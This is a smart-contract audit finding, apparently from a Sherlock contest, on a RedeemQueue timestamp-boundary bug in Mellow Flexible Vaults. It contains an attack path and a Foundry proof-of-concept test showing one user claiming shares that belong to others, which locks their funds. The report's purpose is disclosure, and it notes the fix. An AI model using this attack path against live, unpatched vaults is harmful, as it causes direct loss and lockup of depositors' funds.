---
tags:
  - lang/solidity
  - sector/oracle
  - sector/token
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - vuln/dos/frozen-funds
  - impact/loss-of-funds/direct-drain
  - impact/loss-of-funds/locked-funds
  - fix/use-reentrancy-guard
  - novelty/variant
protocol: "[[Mellow]]"
auditors:
  - "[[7]]"
  - "[[Arav]]"
  - "[[Brene]]"
  - "[[Cybrid]]"
  - "[[JeRRy0422]]"
  - "[[KupiaSec]]"
  - "[[Smacaud]]"
  - "[[algiz]]"
  - "[[blockace]]"
  - "[[bughuntoor]]"
  - "[[dimulski]]"
  - "[[hunt1]]"
  - "[[lodelux]]"
  - "[[reedai]]"
  - "[[silver_eth]]"
  - "[[t.aksoy]]"
report: "https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-judging"
genome:
  - "[[frozen-funds]]"
  - "[[direct-drain]]"
  - "[[locked-funds]]"
  - "[[use-reentrancy-guard]]"
  - "[[variant]]"
  - "[[dos-resistance]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
---
# H-2: RedeemQueue Accounting Mismatch Between Batch Creation and Claim Eligibility

- id: 62107
- impact: HIGH
- protocol: [[Mellow]] Flexible Vaults
- reporter: reedai (Sherlock)
- source: N/A

## Summary


Summary:

The RedeemQueue contract has a critical vulnerability that can lead to accounting inconsistencies and potential loss of funds. This is caused by a mismatch between the timestamp boundary logic in batch creation and claim eligibility checks. This allows users to claim from batches that don't contain their shares, causing accounting mismatches and permanent fund lockup. The vulnerability can be exploited by submitting redemption requests at different timestamps and then calling the _handleReport function with a specific timestamp. The impact of this vulnerability is broken batch accounting and legitimate users being unable to claim their full entitlement. A proof-of-concept has been provided to demonstrate the vulnerability. The protocol team has fixed the issue in their code. To mitigate this vulnerability, the line "latestEligibleIndex--;" should be removed from the code.

## Details


Source: https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-judging/issues/65 

## Found by 
7, Arav, Brene, Cybrid, JeRRy0422, KupiaSec, Smacaud, algiz, blockace, bughuntoor, dimulski, hunt1, lodelux, reedai, silver\_eth, t.aksoy

### Summary

The RedeemQueue contract contains a critical vulnerability where _handleReport processes fewer redemption requests than what users can claim, leading to accounting inconsistencies and potential loss of funds. The issue occurs due to a mismatch between the timestamp boundary logic in batch creation versus claim eligibility checks.

### Root Cause

The vulnerability stems from inconsistent timestamp boundary handling between two functions:

_handleReport: Uses upperLookupRecent(timestamp) followed by latestEligibleIndex--, which excludes the last redemption request before the report timestamp

claim: Uses latestEligibleTimestamp from prices, allowing claims for any timestamp ≤ report timestamp

This creates a scenario where users can claim from batches that don't contain their shares, causing accounting mismatches.

```solidity

    function claim(address receiver, uint32[] calldata timestamps) external nonReentrant returns (uint256 assets) {
...
           //@audit users can claim up to higher price saved
           (bool hasRequest, uint256 shares) = callerRequests.tryGet(timestamp);
            if (!hasRequest) {
                continue;
            }
            if (shares != 0) {
                uint256 index = $.prices.lowerLookup(timestamp);
                if (index >= batchIterator) {
                    continue;
                }
...
}

    function _handleReport(uint224 priceD18, uint32 timestamp) internal override {
        RedeemQueueStorage storage $ = _redeemQueueStorage();

        Checkpoints.Trace224 storage timestamps = _timestamps();
        (, uint32 latestTimestamp, uint224 latestIndex) = timestamps.latestCheckpoint();
        uint256 latestEligibleIndex;
        if (latestTimestamp <= timestamp) {
            latestEligibleIndex = latestIndex;
        } else {
            latestEligibleIndex = uint256(timestamps.upperLookupRecent(timestamp));
            if (latestEligibleIndex == 0) {
                return;
            }
            latestEligibleIndex--;
        }
}...
```

https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults/blob/eca8836d68d65bcbfc52c6f04cf6b4b1597555bf/flexible-vaults/src/queues/RedeemQueue.sol#L219

### Internal Pre-conditions

Multiple users must submit redemption requests at different timestamps
_handleReport must be called with a timestamp that falls between redemption request timestamps
The report timestamp must be greater than some redemption timestamps but not necessarily after all pending requests

### External Pre-conditions

-

### Attack Path

1. Users submit redemption requests:

- User1: timestamp 100 (10,000 shares)
- User2: timestamp 110 (10,000 shares)
- User3: timestamp 120 (10,000 shares)
- User4: timestamp 130 (10,000 shares)

2. handleReport is called with timestamp 125
3. Batch Creation:

- upperLookupRecent(125) returns index pointing to timestamp 120
- latestEligibleIndex-- excludes timestamp 120
- Batch 0 created with only 20,000 shares (from timestamps 100, 110)
- But claim eligibility allows timestamps ≤ 125 (including 100, 110, 120)

4. Claim:

- User3 (timestamp 120) can claim because 120 ≤ 125 (latestEligibleTimestamp)
- User3 claims 10,000 shares from Batch 0 that doesn't include their contribution
- Batch 0 now has only 10,000 shares remaining instead of 20,000
- User1 and User2 can only claim partial amounts, with one user unable to claim at all
- If User3 share ratio is higher more users wouldn't be able to claim

5. Permanent Fund Lockup:

- Next _handleReport call processes User3's 120 timestamp shares into Batch 1
- User3 cannot claim from Batch 1 
- User3's 10,000 shares in Batch 1 become permanently unclaimable

### Impact

Batch accounting would be broken
Legitimate users cannot claim their full entitlement due to depleted batch
Shares processed in subsequent batches become unclaimable


### PoC

// File: flexible-vaults/test/unit/queues/DepositQueue.t.sol

```solidity

    // forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2,3,4,5) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --mt testRedeemMulti
    function testRedeemMulti() external {
        Deployment memory deployment = createVault(
            vaultAdmin,
            vaultProxyAdmin,
            assetsDefault
        );
        DepositQueue queue = DepositQueue(
            addDepositQueue(deployment, vaultProxyAdmin, asset)
        );

        IOracle.SecurityParams memory securityParams = IOracle.SecurityParams({
            maxAbsoluteDeviation: 6e16,
            suspiciousAbsoluteDeviation: 2e16,
            maxRelativeDeviationD18: 4e16,
            suspiciousRelativeDeviationD18: 3e16,
            timeout: 1000,
            depositInterval: 3600,
            redeemInterval: 3600
        });

        vm.prank(deployment.vaultAdmin);
        deployment.oracle.setSecurityParams(securityParams);

        pushReport(
            deployment.oracle,
            IOracle.Report({asset: asset, priceD18: 1e18})
        );

        vm.warp(block.timestamp + securityParams.timeout);

        address user1 = vm.createWallet("user1").addr;
        address user2 = vm.createWallet("user2").addr;
        address user3 = vm.createWallet("user3").addr;
        address user4 = vm.createWallet("user4").addr;
        address user5 = vm.createWallet("user5").addr;
        uint256 amount = 1 ether;

        {
            makeDeposit(user1, amount, queue);

            vm.warp(block.timestamp + securityParams.timeout);
            pushReport(
                deployment.oracle,
                IOracle.Report({asset: asset, priceD18: 1e18})
            );

            makeDeposit(user2, amount, queue);

            vm.warp(block.timestamp + securityParams.timeout);
            pushReport(
                deployment.oracle,
                IOracle.Report({asset: asset, priceD18: 1e18})
            );

            makeDeposit(user3, amount, queue);
            makeDeposit(user4, amount, queue);
            makeDeposit(user5, amount, queue);
            emit log_int(deployment.riskManager.pendingAssets(asset));

            vm.warp(block.timestamp + securityParams.depositInterval);
            pushReport(
                deployment.oracle,
                IOracle.Report({asset: asset, priceD18: 1e18})
            );
        }

        vm.warp(block.timestamp + securityParams.depositInterval);

        queue.claim(user1);
        queue.claim(user2);
        queue.claim(user3);
        queue.claim(user4);
        queue.claim(user5);

        //@audit setup RedeemQueue
        vm.startPrank(deployment.vaultAdmin);
        deployment.vault.setQueueLimit(deployment.vault.queueLimit() + 1);
        deployment.vault.createQueue(
            0,
            false,
            vaultProxyAdmin,
            asset,
            new bytes(0)
        );
        vm.stopPrank();

        RedeemQueue redeemQue = RedeemQueue(
            payable(
                deployment.vault.queueAt(
                    asset,
                    deployment.vault.getQueueCount(asset) - 1
                )
            )
        );

        vm.prank(deployment.feeManager.owner());
        deployment.feeManager.setFees(0, 0, 0, 0);

        //@audit start redemptions
        uint256 redeemStart = block.timestamp;
        uint256 redeemAmount = 10000000;

        makeRedeem(user1, redeemAmount, redeemQue);

        skip(100);
        makeRedeem(user2, redeemAmount, redeemQue);

        skip(100);
        makeRedeem(user3, redeemAmount, redeemQue);

        //@audit make report after second user redeem time
        vm.startPrank(address(deployment.vault));
        redeemQue.handleReport(uint224(1e18), uint32(redeemStart + 150));
        vm.stopPrank();

        (, uint256 batchShares) = redeemQue.batchAt(0);
        //@audit only first user is processes
        assertEq(batchShares, redeemAmount);

        redeemQue.handleBatches(2);
        assertEq(ERC20(asset).balanceOf(address(redeemQue)), redeemAmount);

        uint32[] memory timestamps = new uint32[](1);

        timestamps[0] = uint32(redeemStart + 100);
        vm.prank(user2);
        //@audit second user can claim even thoough only first user shares are processed
        redeemQue.claim(user2, timestamps);
        assertEq(ERC20(asset).balanceOf(address(user2)), redeemAmount);

        timestamps[0] = uint32(redeemStart);
        vm.prank(user1);
        //@audit Fails here ::[FAIL: panic: division or modulo by zero (0x12)]
        //@audit first user cant claim since user 2 removed all shres
        vm.expectRevert();
        redeemQue.claim(user1, timestamps);
        assertEq(ERC20(asset).balanceOf(address(user1)), 0);
    }

```

### Mitigation

Dont remove the last user from the batch processing

`        // latestEligibleIndex--; // REMOVE THIS LINE`


## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/mellow-finance/flexible-vaults/pull/11
